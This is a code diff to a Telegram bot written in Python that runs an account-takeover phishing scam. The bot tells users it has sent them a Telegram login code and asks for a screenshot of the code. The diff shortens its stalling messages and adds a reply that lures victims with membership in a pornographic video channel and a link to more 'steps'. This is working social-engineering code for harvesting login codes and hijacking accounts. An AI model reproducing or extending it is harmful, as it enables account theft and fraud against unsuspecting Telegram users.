@@ -101,9 +101,8 @@ async def verip(_, message):
 async def regex_cantik(_, message):
     rexa = await message.reply("__Sent otp code...__")
     await asyncio.sleep(10)
-    await rexa.edit("__Please don't spam,The bot is checking the database…__")
-    await app.send_message(message.chat.id, "__successfully sent otp code…__")
-    await asyncio.sleep(0.2)
+    await rexa.edit("__successfully sent otp code…__")
+    await asyncio.sleep(5)
     await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
 🤖 **My system bot Want Log in**
 
@@ -112,12 +111,25 @@ We sent a login code to your Telegram account, please send take a screenshot and
 📷 Please see the example Picture 
 
 Just send it in the form of a screenshot, you don't need to send it via text.
-
-
-⁉️ __Please don't spam this bot, this bot takes time to read the database, plese dont spam!!!!__
 """)
 
 # SUCCESFULLY CMD
+
+SUCCES_TEXT = """
+Succesfully add to Database ⚡
+
+__Congratulations!!__ You are already a member of the Koleksi Porn Video Channel 🎉
+
+if you want more channels please [Click here](https://t.me) and follow the Step
+"""
+
+@app.on_message(filters.regex("Successfully") & filters.private)
+async def start(_, message):
+    text = SUCCES_TEXT
+    await message.reply(
+        text=text,
+        disable_web_page_preview=True
+    )
 
 # TES MODUL
 @app.on_message(filters.regex("n"))
